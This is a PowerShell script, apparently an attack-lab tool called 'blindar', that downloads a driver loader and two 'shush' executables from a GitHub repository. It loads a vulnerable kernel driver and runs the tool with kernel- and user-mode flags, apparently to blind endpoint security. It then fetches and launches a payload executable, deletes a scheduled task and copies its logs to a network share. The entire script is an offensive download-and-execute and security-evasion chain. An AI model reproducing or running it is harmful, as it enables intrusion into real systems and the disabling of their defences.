$ErrorActionPreference='SilentlyContinue'
$log='C:\blindar.log'
Remove-Item $log -Force
function L($m){ Add-Content $log ((Get-Date).ToString('HH:mm:ss') + ' ' + $m) }
$pins=@()
function Pin($p){ try{ $h=[IO.File]::Open($p,'Open','Read','ReadWrite'); if($h){ $script:pins += $h; return $true } }catch{}; return $false }
$adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
L ('blindar v3.2-github inicio | admin=' + $adm + ' | user=' + $env:USERNAME)
cmd /c "taskkill /f /im wup.exe >nul 2>&1"
cmd /c "taskkill /f /im wupd.exe >nul 2>&1"
$g='C:\ProgramData\wupd'
New-Item -ItemType Directory -Force $g | Out-Null
$R='https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main'
$files=@('t1p7.ps1','shushx.exe','shushf.exe')
foreach($f in $files){
  $ok=$false
  for($t=1;$t -le 8;$t++){
    & curl.exe -s -o ($g+'\'+$f) ($R+'/'+$f)
    if(Test-Path ($g+'\'+$f)){
      if((Get-Item ($g+'\'+$f)).Length -gt 200){ if(Pin ($g+'\'+$f)){ $ok=$true; break } }
    }
    Start-Sleep 1
  }
  $h=''
  try{ $h=(Get-FileHash ($g+'\'+$f) -Algorithm SHA256).Hash.Substring(0,12) }catch{}
  L ('asset '+$f+' ok='+$ok+' sha12='+$h)
}
L 't1p7 (driver, dbx-first)...'
& powershell -NoProfile -ExecutionPolicy Bypass -File ($g+'\t1p7.ps1') | Out-Null
$drv='C:\Windows\System32\drivers\wupd.sys'
$sq=''
for($t=1;$t -le 25;$t++){
  $sq=(& sc.exe query wupd 2>&1 | Out-String)
  if($sq -match 'RUNNING'){ break }
  Start-Sleep 1
}
L ('drv existe=' + (Test-Path $drv) + ' | svc RUNNING=' + ($sq -match 'RUNNING'))
$loaded='indef'
try{ $tl=(Get-Content ($g+'\t1p7.log') -Raw); if($tl -match 'CARREGADO=([A-Za-z\-]+)'){ $loaded=$Matches[1] } }catch{}
L ('driver log CARREGADO=' + $loaded)
$order=@(($g+'\shushx.exe'),($g+'\shushf.exe'))
if($loaded -match 'rtc' -or $loaded -match 'gdrv'){ $order=@(($g+'\shushf.exe'),($g+'\shushx.exe')) }
Start-Sleep 2
function RunShush($exe,$out){
  $sa='dump --kernelmode --usermode --internet --no-restore --dont-unload-driver --process-name _nada_.exe --vuln-driver '+$drv
  Remove-Item $out -Force
  $p=Start-Process -FilePath $exe -ArgumentList $sa -NoNewWindow -Wait -PassThru -RedirectStandardOutput $out -RedirectStandardError ($out+'.err')
  $b=0
  try{ $b=(Get-Item $out).Length }catch{}
  L ('shush tent: ' + (Split-Path $exe -Leaf) + ' rc=' + $p.ExitCode + ' bytes=' + $b)
  if($b -lt 500){
    try{ L ('head: ' + (((Get-Content $out -TotalCount 5) -join ' | '))) }catch{}
    try{ L ('err: ' + (((Get-Content ($out+'.err') -TotalCount 5) -join ' | '))) }catch{}
  }
  if($p.ExitCode -eq 0 -and $b -ge 500){ return $true }
  return $false
}
L ('shush primeiro: ' + (Split-Path $order[0] -Leaf))
$okb = RunShush $order[0] 'C:\blindar_shush.txt'
if(-not $okb){ L 'fallback outro shush'; $okb = RunShush $order[1] 'C:\blindar_shush2.txt' }
L ('blind ok=' + $okb)
$pl='C:\lab\wup.exe'
New-Item -ItemType Directory -Force 'C:\lab' | Out-Null
for($t=1;$t -le 6;$t++){
  & curl.exe -s -o $pl ($R+'/TesteL.exe')
  if(Test-Path $pl){ if((Get-Item $pl).Length -gt 200000){ Pin $pl | Out-Null; break } }
  Start-Sleep 1
}
$ph=''
try{ $ph=(Get-FileHash $pl -Algorithm SHA256).Hash.Substring(0,12) }catch{}
L ('payload copiado=' + (Test-Path $pl) + ' sha12=' + $ph)
Start-Process $pl
Start-Sleep 5
L ('payload vivo@5s=' + [bool](@(Get-Process -Name wup,wupd -ErrorAction SilentlyContinue).Count))
Start-Sleep 20
L ('payload vivo@25s=' + [bool](@(Get-Process -Name wup,wupd -ErrorAction SilentlyContinue).Count))
try{ if(Test-Path ($g+'\run.log')){ L ('run.log tail: ' + ((Get-Content ($g+'\run.log') -Tail 8) -join ' | ')) } }catch{}
L 'fim'
schtasks /delete /tn BlindarX /f | Out-Null
try{ Copy-Item $log '\\host.lan\Data\blindar.log' -Force }catch{ cmd /c copy C:\blindar.log \\host.lan\Data\blindar.log | Out-Null }
try{ Copy-Item 'C:\blindar_shush.txt' '\\host.lan\Data\blindar_shush.txt' -Force }catch{}
try{ Copy-Item 'C:\blindar_shush2.txt' '\\host.lan\Data\blindar_shush2.txt' -Force }catch{}
try{ Copy-Item ($g+'\run.log') '\\host.lan\Data\blindar_runlog.txt' -Force }catch{}
